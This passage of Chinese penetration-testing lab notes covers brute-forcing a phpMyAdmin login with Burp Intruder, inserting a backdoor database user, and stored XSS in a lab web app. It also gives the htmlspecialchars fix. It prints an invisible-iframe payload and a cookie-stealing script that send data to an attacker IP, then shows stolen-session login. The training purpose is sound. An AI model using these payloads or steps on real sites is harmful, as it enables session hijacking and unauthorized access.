+<a name="73fr5rf4c9sgcmmbn0en2r2r7h">&nbsp;&nbsp;&nbsp;使用intruder进行密码爆破此功能在Burp社区版中受时间限制。</a>
+</h3>
+<h3 class="topic">
+<a name="6jrgif3nio096vqfjvvd6ekjvv">&nbsp;&nbsp;&nbsp;手动登陆并使用burpsuite抓包，得到以上登陆请求包，登录表单包含一个token以防止暴力破解和其他攻击。 此外，我们可以看到该表单设置了一个set_session参数，该参数对于每个请求都是唯一的。（关于tokenhttps://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern）&#13;
+且cookie值与session值相等</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0rh03v3gf1f89vdvvpc3hetg27.png"></p>
+<h3 class="topic">
+<a name="6gujmon8ep257cntkd9hakh56m">&nbsp;&nbsp;&nbsp;&nbsp;如果我们更改set_session参数，但该参数与phpMyAdmin cookie的值不匹配，则该网站将返回错误：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/5020n1r4nnivu55rs1v644hi2o.png"></p>
+<h3 class="topic">
+<a name="7hcigq7q6qb1om0jqtgd5aofi7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果要成功登录，我们需要避免此错误。 如果我们查看登录表单的HTML源，则会发现新的set_session和令牌值包含在响应中：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3gv343sm6r2dkmarvljhacv4ih.png"></p>
+<h3 class="topic">
+<a name="13lm01b73shqsm1r0e30qi4ipl">&nbsp;&nbsp;&nbsp;将登陆请求发送到intruder</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/38qudr6li6pa1l5mgq29cvu12n.png"></p>
+<h3 class="topic">
+<a name="4fl0otttaaq5t62tm1ugvnbp1j">&nbsp;&nbsp;&nbsp;&nbsp;intruder选项卡中target中已经默认填充了目标服务器ip和端口</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/41k5oqt5mb8lqvp25anvsgod3h.png"></p>
+<h3 class="topic">
+<a name="3moup39lptib2cuv5fdef8l9ud">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;positions标签中点击clear 将所有的变量先去除，然后仅仅将cookie session password token设置为变量</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/6pmv6s3r3oeutc50gbce6v9ps9.png"></p>
+<h3 class="topic">
+<a name="1sbi57m4da493n6cfmeq33qcte">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将登陆请求中需要修改的字段设置为变量，然后将攻击类型设置为pitchdork，从而可以为每个位置设置唯一的有效载荷列表。 pitchdork攻击会将每个列表中的第一个值放到各自的位置，然后发送请求。 下一个请求将使用每个列表中的第二个值，依此类推。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/5870s3sv0v49tumgn2ndil583u.png"></p>
+<h3 class="topic">
+<a name="462opbhc2966ufs591cf77d4c0">&nbsp;&nbsp;&nbsp;我们需要可以从响应中提取值并将其注入下一个请求的工具。  Burp Suite包含一个&ldquo;递归grep&rdquo;有效负载，该负载可使用grep搜索响应以获取预定义值，并使结果可用于下一个请求。 这正是我们需要设置phpMyAdmin cookie值，set_session帖子主体值和令牌字段的内容。&#13;
+所以在option选项卡中add从而增加递归grep</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7ln14pjp4h56io00nf94jqeecg.png"></p>
+<h3 class="topic">
+<a name="7h51pd576o21hbe576imja6hsf">&nbsp;&nbsp;&nbsp;&nbsp;弹出带有HTTP响应的新窗口，我们可以使用该响应来定义要提取的项目的位置，单击并选择要定位的字段的值。，Burp将自动设置&ldquo;表达式后开始&rdquo;和&ldquo;定界符结束&rdquo;值，以定义grep提取的定界符，并点击ok</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/101thgp5av3t94dvg5cja50kd0.png"></p>
+<h3 class="topic">
+<a name="484jju6u1pen9hoh6hi6g5p0g4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从Intruder &gt; 2 &gt; Options点击 Add 添加另一个递归grep</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/44q484j6rh668i7h23ohisaia7.png"></p>
+<h3 class="topic">
+<a name="1e4c3eluv7tcbihrtu8fkauhg2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;单击&ldquo;有效负载&rdquo;选项卡来设置有效负载。 我们将总共设置四个有效载荷。 我们标记的每个位置都有一个有效负载设置值，它们顺序匹配这些位置。 换句话说，第一个设置为会话cookie，第二个设置为会话字段，第三个设置为密码字段，第四个设置为令牌字段。有效负载集之一是phpMyAdmin会话cookie值。 我们需要为该类型选择&ldquo;递归Grep&rdquo;，然后单击&ldquo;从[_session&ldquo; value =&rdquo;]到[&ldquo; /&gt; Log]作为有效负载选项。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/37a2gncs9cubtqpelr0mhn6n7m.png"></p>
+<h3 class="topic">
+<a name="6u0q1sml4848vhbn4sj8nucoke">&nbsp;&nbsp;&nbsp;有效负载集二是set_session值。 它需要匹配phpMyAdmin cookie的值，因此我们将使用与有效负载集一相同的设置-类型为&ldquo;递归Grep&rdquo;，将有效负载选项从[_session&ldquo; value =&rdquo;]到[&ldquo; /&gt; Log]  。</a>
+</h3>
+<h3 class="topic">
+<a name="1u4r0v519t2ddbk92og1kt0af6">&nbsp;&nbsp;&nbsp;&nbsp;第三个有效载荷的类型为list，即可以添加常用的密码作为载荷</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/78dkvpqedgvgmm4eaca80c6dpe.png"></p>
+<h3 class="topic">
+<a name="35ml2dbs1ukquqcb9jp766tqsa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有效载荷集四是令牌值。 我们将再次使用&ldquo;递归grep&rdquo;有效负载类型，并从[.php&ldquo; /&gt; &lt;输入类型=&ldquo;隐藏&rdquo; name =&ldquo;令牌&rdquo; value =&rdquo;]到[&ldquo; /&gt; &lt;fieldset&gt;]作为有效负载选项</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/2903kmnsh9v2ouk76quaf0a07c.png"></p>
+<h3 class="topic">
+<a name="0371uqa222g1as6733pj3q52om">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;点击攻击按钮，在弹出窗口中点击ok</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7n9fou4pbd6k8oicc964e05jo7.png"></p>
+<h3 class="topic">
+<a name="796np78ftmnrcnu92n9nsfkupu">&nbsp;&nbsp;&nbsp;查看攻击结果，发现一个响应状态为302说明登录成功并执行跳转，该条目还包含一个&ldquo; pmaAuth-1&rdquo; cookie，表明登录成功，对应的用户名和密码均为root</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/58h117o5b4jn9ri1ldid8d7plh.png"></p>
+<h3 class="topic">
+<a name="4ghb29sre5b17c9gnb4ruulj5n">&nbsp;&nbsp;&nbsp;&nbsp;浏览器中手动验证登陆，显示登陆成功</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/35hk5kjak7mdq7i8mt6hdcqktk.png"></p>
+<h3 class="topic">
+<a name="5na8k5oqsm9hnsm7hsrmhdpr7p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;登陆成功后可以使用sql语句进行查询</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/16jbjseadq3ndf0kpvq6aumdt0.png"></p>
+<h3 class="topic">
+<a name="14l03pc2t9ioq6hd5rukhp3ra1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示查询结果</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/65jng6j3ld077ejpicb66pl355.png"></p>
+<h3 class="topic">
+<a name="2op7sqama4d86iv5fbhgo946tm">&nbsp;&nbsp;&nbsp;执行sql语句插入后门用户</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7h57737c36c0vd1gf7ep6d92ai.png"></p>
+<h3 class="topic">
+<a name="2em819e5g4qpnv1fopo5lid6gp">&nbsp;&nbsp;&nbsp;&nbsp;数据插入成功</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/383beqbam4jqmq9btli18t5n6q.png"></p>
+<h3 class="topic">
+<a name="01l13rsn4diknro6apbt1sgrvl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0oatkht719slcjdm4j5srt2eth.png"></p>
+<h3 class="topic">
+<a name="5kkqupilg7hugcuvb16urfp0nl">&nbsp;跨站脚本（XSS）</a>
+</h3>
+<h3 class="topic">
+<a name="5qct47ov65lh9olrn9uqr1beof">&nbsp;&nbsp;防护良好的Web应用程序最重要的功能之一是数据清理，该过程中处理用户输入，删除或转换所有危险字符或字符串。 未经清理的数据使攻击者可以注入并可能执行恶意代码，此未经过滤的输入会显示在网页上，这会产生跨站点脚本（XSS）漏洞，xss使得攻击者能够将客户端脚本（例如JavaScript）注入其他用户查看的网页中。</a>
+</h3>
+<h3 class="topic">
+<a name="3tr48mgm6d7m9qej04ftlov3ji">&nbsp;&nbsp;xss分类</a>
+</h3>
+<h3 class="topic">
+<a name="6108m7507i1jipsml8ap0soiic">&nbsp;&nbsp;&nbsp;存储型xss</a>
+</h3>
+<h3 class="topic">
+<a name="5ik40etppgbdjpsv54ktq8gr3p">&nbsp;&nbsp;&nbsp;&nbsp;当漏洞利用有效载荷存储在数据库中或由服务器缓存时，就会发生存储的XSS攻击（也称为持久XSS）。 然后，Web应用程序检索此有效负载并将其显示给查看易受攻击页面的任何人。 因此，一个&ldquo;存储的XSS&rdquo;漏洞可以攻击站点的所有用户。 在论坛软件中，特别是在评论部分或产品评论中，通常存在存储的XSS漏洞。</a>
+</h3>
+<h3 class="topic">
+<a name="08r93mtu83pk5pggp3pc2pj6jc">&nbsp;&nbsp;&nbsp;反射型xss</a>
+</h3>
+<h3 class="topic">
+<a name="0f3kkiqmm07km783cldibs0gv8">&nbsp;&nbsp;&nbsp;&nbsp;   反射的XSS攻击通常将有效负载包含在精心设计的请求或链接中。  Web应用程序将使用此值并将其放入页面内容中。 此变体仅攻击提交请求或查看链接的人。 反映出的XSS漏洞通常会出现在搜索字段和结果中以及错误消息中包含用户输入的任何位置。</a>
+</h3>
+<h3 class="topic">
+<a name="2loi7s0esju9g1840oqohctuqv">&nbsp;&nbsp;&nbsp;DOM型xss</a>
+</h3>
+<h3 class="topic">
+<a name="7cmv0nhbkhup5b40rdmfe30bjv">&nbsp;&nbsp;&nbsp;&nbsp;   基于DOM的XSS攻击与其他两种类型相似，但仅在页面的文档对象模型（DOM）内进行。目前，我们不会涉及很多细节，但是浏览器会解析页面的HTML内容并生成 内部DOM表示形式。  JavaScript可以通过编程方式与此DOM进行交互。当使用用户控制的值修改页面的DOM时，会发生这种变化。 可以存储或反映基于DOM的XSS。 关键区别在于，当浏览器解析页面内容并执行插入的JavaScript时，就会发生基于DOM的XSS攻击。</a>
+</h3>
+<h3 class="topic">
+<a name="3j901qj3i96iv6r59mhgp7bek8">&nbsp;&nbsp;xss的影响</a>
+</h3>
+<h3 class="topic">
+<a name="1cmtjtnbt1vikoth4perf22etv">&nbsp;&nbsp;&nbsp;不管XSS有效负载如何传递和执行，注入的脚本都在用户查看受影响页面的上下文下运行。 也就是说，用户的浏览器而非Web应用程序将执行XSS有效负载。 尽管如此，这些攻击仍会产生重大影响，导致会话劫持，强制重定向到恶意页面，以该用户身份执行本地应用程序等等</a>
+</h3>
+<h3 class="topic">
+<a name="3dooqq6agce49a506fi95uil4n">&nbsp;&nbsp;识别xss</a>
+</h3>
+<h3 class="topic">
+<a name="21s651emm4fdbhlqg0g67u6sks">&nbsp;&nbsp;&nbsp;可以通过检查Web应用程序并标识接受未过滤输入的输入字段（例如搜索字段）来找到XSS的潜在入口点，这些输入在后续页面中显示为输出。&#13;
+   一旦确定了入口点，就可以输入特殊字符，并观察输出以查看是否有任何特殊字符返回未经过滤。</a>
+</h3>
+<h3 class="topic">
+<a name="3b0h91dqvb09r1cnrd42sk9s0n">&nbsp;&nbsp;&nbsp;&nbsp;用于识别xss所使用的特殊字符&lt; &gt; ' " { } ; &#13;
+HTML使用&ldquo; &lt;&rdquo;和&ldquo;&gt;&rdquo;来表示元素，这些元素构成了HTML文档。  JavaScript在函数声明中使用&ldquo; {&rdquo;和&ldquo;}&rdquo;。 单引号（&rsquo;）和双引号（&ldquo;）表示字符串，分号（;）表示语句的结尾。&#13;
+   如果应用程序未删除或编码这些字符，则XSS可能会受到攻击，因为这些字符可用于将代码引入页面。</a>
+</h3>
+<h3 class="topic">
+<a name="3mp1ksns9vtur9a1hc60s0plup">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果我们可以将这些特殊字符注入页面，则浏览器会将它们视为代码元素。 然后，我们可以开始构建将在受害者的浏览器中执行的代码。&#13;
+   根据输入的位置，我们可能需要不同的字符集。 例如，如果我们的输入被添加到div标签之间，则我们将需要包括自己的脚本标签，并且需要能够将&ldquo; &lt;&rdquo;和&ldquo;&gt;&rdquo;作为有效载荷的一部分注入。 如果我们的输入是在现有JavaScript标记内添加的，则可能只需要引号和分号来添加我们自己的代码。</a>
+</h3>
+<h3 class="topic">
+<a name="0rf20f0ddek8fe2jao6scs7ib8">&nbsp;&nbsp;基本XSS</a>
+</h3>
+<h3 class="topic">
+<a name="2dfq2k55qpm7767re6geeh1gad">&nbsp;&nbsp;&nbsp;win10中运行XAMMP,并安装apache和MySQL</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/59pb2e2qkjhums2k277fvsjbgj.png"></p>
+<h3 class="topic">
+<a name="766itrc07t9s59ekkds7bh6v80">&nbsp;&nbsp;&nbsp;&nbsp;在&ldquo;反馈&rdquo;表单字段中插入一些特殊字符并提交。 我们将首先提交一些特定于JavaScript的字符：双引号（&ldquo;），分号（;），&rdquo; &lt;&ldquo;和&rdquo;&gt;&ldquo;：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/54das0gmjmjfkc0k4tqhvlam3e.png"></p>
+<h3 class="topic">
+<a name="26gal26t3ctraip2p6gkj9eum6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检查工具中可以看到用户的输入没有被删除或编码，并且已经作为html文件的一部分返回到浏览器中了</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7vbl21sq9m6uhlh9gnqqccj2ga.png"></p>
+<h3 class="topic">
+<a name="286c7s06r5thfr0nbuc8foik45">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看网站接收用户输入的源码，代码40行处将name字段和comment字段未经修改直接插入数据库。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0u8itu44bv8m1f5lh9lti4k131.png"></p>
+<h3 class="topic">
+<a name="1941nbkmr9ns7gb3oe3pkmaaah">&nbsp;&nbsp;&nbsp;查看服务器输出时的源码，第44行将数据库的结果写入页面。 即将数据库中的数据直接输出而没有任何修改</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/70jg7lokq32ejh28rb2e13hjeq.png"></p>
+<h3 class="topic">
+<a name="01h8lgdbrtph1qcpehm25pl6u5">&nbsp;&nbsp;&nbsp;&nbsp;即对于xss漏洞，可以在数据输入、数据输出两个地方对数据进行清理， 在PHP中，可以在显示字符串之前使用htmlspecialchars函数将关键字符转换为HTML实体。 从而防止此XSS漏洞。</a>
+</h3>
+<h3 class="topic">
+<a href="https://php.net/manual/en/function.htmlspecialchars.php" name="5pnbuqrgf4bjge357bobrce22v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;htmlspecialchars函数：&#13;
+https://php.net/manual/en/function.htmlspecialchars.php</a>
+</h3>
+<h3 class="topic">
+<a name="376f5cecmfqcnlsgdfnpg9a2bv">&nbsp;&nbsp;&nbsp;将&ldquo; &lt;script&gt; alert（'XSS'）&lt;/ script&gt;&rdquo;输入数据库中</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/2sqgvo99qk7ukboekf8qq40gaq.png"></p>
+<h3 class="topic">
+<a name="5q99vbm0ke5v21ciekdklnjpgs">&nbsp;&nbsp;&nbsp;&nbsp;刷新该web页面之后插入的js指令被运行</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/4dgquhri2altoj3o983dbjo6eu.png"></p>
+<h3 class="topic">
+<a name="7i583bio85npu3m0hj69o1240t">&nbsp;&nbsp;内容注入（即通过xss进行网页重定向）</a>
+</h3>
+<h3 class="topic">
+<a name="7ghnit996iakr9lh6pdq7k6bmj">&nbsp;&nbsp;&nbsp;xss允许将受害者的浏览器重定向到攻击者选择的位置。 重定向的一种隐形替代方法是将不可见的iframe注入到我们的XSS有效负载中。</a>
+</h3>
+<h3 class="topic">
+<a name="6k31sgf24u1q67kftafg9pdt0k">&nbsp;&nbsp;&nbsp;&nbsp;&lt;iframe src=http://10.11.0.4/report height=&rdquo;0&rdquo; width=&rdquo;0&rdquo;&gt;&lt;/iframe&gt;</a>
+</h3>
+<h3 class="topic">
+<a name="0mc7b911nebtch96baj46gjm5q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iframe用于将另一个文件（例如图像或另一个HTML文件）嵌入当前HTML文档中。 在我们的例子中，&ldquo;report&rdquo;是一个超链接到攻击机的文件，由于高度和宽度设置为零，因此iframe没有大小，因此它是不可见的。</a>
+</h3>
+<h3 class="topic">
+<a name="72g6lajaei2kkrc6fqeh3g413l">&nbsp;&nbsp;&nbsp;提交此有效负载后，所有访问该页面的用户都将重新连接到我们的攻击机器。 为了测试这一点，我们可以在端口80上的攻击机器（在本示例中为10.11.0.4）上创建一个Netcat侦听器，并刷新&ldquo;反馈&rdquo;页面。</a>
+</h3>
+<h3 class="topic">
+<a name="6cjunvl78g1sac7grqipa6ah3q">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/4ggpjsq1kioq4fq0mc2kv8sqcj.png"></p>
+<h3 class="topic">
+<a name="4je80ddkcb9j4k9ml7mtt68ban">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用netcat对攻击机80端口进行监听，被攻击浏览器会访问攻击机的80端口</a>
+</h3>
+<h3 class="topic">
+<a name="1lc7hqkgqul79kggk1vpdhnikq">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/7fsgovlf22ne0349d5ke2pp1jt.png"></p>
+<h3 class="topic">
+<a name="6ecgmn7d4bmo663at8cg8s3vsp">&nbsp;&nbsp;&nbsp;   我们可以更进一步，将受害浏览器重定向到客户端攻击或信息收集脚本。&#13;
+   为此，我们希望首先捕获受害者的User-Agent标头，以帮助识别他们使用的浏览器类型。 在上面的示例中，我们使用了Netcat，因为它向我们显示了浏览器发送的完整请求，包括User-Agent标头。 默认情况下，Apache HTTP Server还将在/var/log/apache2/access.log中捕获User-Agent标头。&#13;
+   我们将不在这里执行任何客户端攻击。 相反，我们将尝试以管理用户身份访问Web应用程序。（即窃取用户cookie，从而登陆用户程序）</a>
+</h3>
+<h3 class="topic">
+<a name="7vd2jdntfvhaq7ajqf7d0o6mei">&nbsp;&nbsp;窃取Cookie和会话信息</a>
+</h3>
+<h3 class="topic">
+<a name="6o1cbkl04t0vugi0ejs93v37ed">&nbsp;&nbsp;&nbsp;如果应用程序使用不安全的会话管理配置，我们还可以使用XSS窃取cookie269和会话信息。 如果我们可以窃取经过身份验证的用户的Cookie，则可以在目标网站中伪装成该用户。</a>
+</h3>
+<h3 class="topic">
+<a name="4iksinft05e0t5p202ao4uhg5n">&nbsp;&nbsp;&nbsp;关于cookie</a>
+</h3>
+<h3 class="topic">
+<a name="6puk0gia5u1a059g4ms7292r32">&nbsp;&nbsp;&nbsp;&nbsp;   为了提供一些背景信息，网站使用cookie来跟踪state270和有关用户的信息。  Cookie可以设置几个可选标志，其中两个对于渗透测试人员来说特别有趣：Secure和HttpOnly。&#13;
+   Secure271标志指示浏览器仅通过加密连接（例如HTTPS）发送cookie。 这样可以防止cookie以明文形式发送并通过网络捕获。&#13;
+   HttpOnly272标志指示浏览器拒绝JavaScript访问cookie。 如果未设置此标志，则可以使用XSS有效负载来窃取Cookie。</a>
+</h3>
+<h3 class="topic">
+<a name="2umqpjm546qhtnv2g6d9n6ldg5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state</a>
+</h3>
+<h3 class="topic">
+<a name="4lo1vk7f685kqcf8siop57utn5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://en.wikipedia.org/wiki/Session_(computer_science)</a>
+</h3>
+<h3 class="topic">
+<a name="522hg02jgq88oor5cqg7b7nd09">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Secure</a>
+</h3>
+<h3 class="topic">
+<a href="https://en.wikipedia.org/wiki/Secure_cookie" name="7nehujkebp10jk56ppi2s4t100">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://en.wikipedia.org/wiki/Secure_cookie</a>
+</h3>
+<h3 class="topic">
+<a name="6786a9rtrn11h2snvpjg6b8rrn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpOnly</a>
+</h3>
+<h3 class="topic">
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies" name="0oe9l0isokr9hf3cmbiu1c3h90">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies</a>
+</h3>
+<h3 class="topic">
+<a name="79ol30a47k7elld4d50ndp54t5">&nbsp;&nbsp;&nbsp;&nbsp;即使未设置此标志，我们也必须解决其他一些浏览器控件的问题，因为浏览器安全性要求不能将一个域设置的cookie直接发送到另一个域。 顺便说一句，对于Set-Cookie指令中的子域，可以通过Domain和Path标志放宽对它的限制。 作为一种解决方法，如果JavaScript可以访问cookie值，则可以将其用作链接的一部分并发送该链接，我们可以对其进行解构以获取cookie值。</a>
+</h3>
+<h3 class="topic">
+<a name="4128066qmnhlj53a0518bv9ad6">&nbsp;&nbsp;&nbsp;示例应用程序在管理员用户登录时设置了PHPSESSID cookie。该应用程序使用该cookie来确定用户是否已通过身份验证。 如果我们修改有效负载，则可以捕获受害者的PHPSESSID Cookie，以访问其经过身份验证的会话。</a>
+</h3>
+<h3 class="topic">
+<a name="0kas650jedifqcbv1qprmsivr7">&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;&lt;/script&gt;</a>
+</h3>
+<h3 class="topic">
+<a name="3eterl2oarukrbic19hv9vgi5h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们将使用JavaScript读取cookie的值，并将其附加到链接回攻击机器的图像URL。 浏览器将读取图像标签，并将GET请求发送给我们的攻击系统，并将受害者的Cookie作为URL查询字符串的一部分。</a>
+</h3>
+<h3 class="topic">
+<a name="3sv3g317bqnddols7dm3vfpiri">&nbsp;&nbsp;&nbsp;在Windows 10实验计算机上使用PowerShell脚本（Documents / admin_login.ps1）模拟管理员用户登录（也可以手动登陆）</a>
+</h3>
+<h3 class="topic">
+<a name="7gusi7km5nl876nefqmrbcu2it">&nbsp;&nbsp;&nbsp;&nbsp;即运行该powershell脚本从而进行登录</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/5pmncfl3voirgmblf8gq5lmbtd.png"></p>
+<h3 class="topic">
+<a name="0b6d2lu1cul1l70n6gcs5rl3v1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用-ExecutionPolicy Bypass运行脚本以暂时允许未签名的脚本，以及-File admin_login.ps1来指定要执行的脚本：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/57c7bgkmas7a2odgtcstctn4fm.png"></p>
+<h3 class="topic">
+<a name="15u78a0qam75ch6i6k13errr7m">&nbsp;&nbsp;&nbsp;当我们的受害者查看受影响的页面时，他们的浏览器将使用经过身份验证的会话ID值与我们建立连接：</a>
+</h3>
+<h3 class="topic">
+<a name="20n7c45jhv3igbo9dlg7uuujbr">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/4jo08bdamnkfmasveo7eo4b3ag.png"></p>
+<h3 class="topic">
+<a name="4i91rbdoibci1qvup52t1smnf8">&nbsp;&nbsp;&nbsp;使用浏览器插件设置获得的cookie从而进行登陆</a>
+</h3>
+<h3 class="topic">
+<a name="2fqlm2vmduh8u2beba3iljrfvu">&nbsp;&nbsp;&nbsp;&nbsp;使用Cookie-Editor浏览器插件轻松设置和操作cookie。  我们可以通过在Firefox中浏览到https://addons.mozilla.org/en-US/firefox/addon/cookieeditor/并单击&ldquo;添加到Firefox&rdquo;来安装此附加组件： </a>
+</h3>
+<h3 class="topic">
+<a name="2mjsmuhscblm53ii4u4774fimn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/6i8jaernqvub38e5pdjnvnf9kp.png"></p>
+<h3 class="topic">
+<a name="299b9h3mb3obrboktbfng25u0q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;插件安装成功</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/3e4kr5f9l2l7l7upa9mma025vr.png"></p>
+<h3 class="topic">
+<a name="29jr8g1avtumou8sab91ptdllr">&nbsp;&nbsp;&nbsp;&nbsp;点击添加按钮，粘贴被盗的Cookie值，然后点击添加以保存新的Cookie：</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/4v2eap0jfjl04f3sd21f3epbbi.png"></p>
+<h3 class="topic">
+<a name="0e9p5ra54u72norrae2r4vum18">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;添加Cookie值后，我们无需提供任何凭据即可浏览至/admin.php的管理界面。</a>
+</h3>
+<p class="topicImage">
+<img src="%E6%94%BB%E5%87%BBweb%E5%BA%94%E7%94%A8%EF%BC%88part1%EF%BC%89_files/0a4ftm52g77ol4kkr5khv0ur1n.png"></p>
+<h3 class="topic">
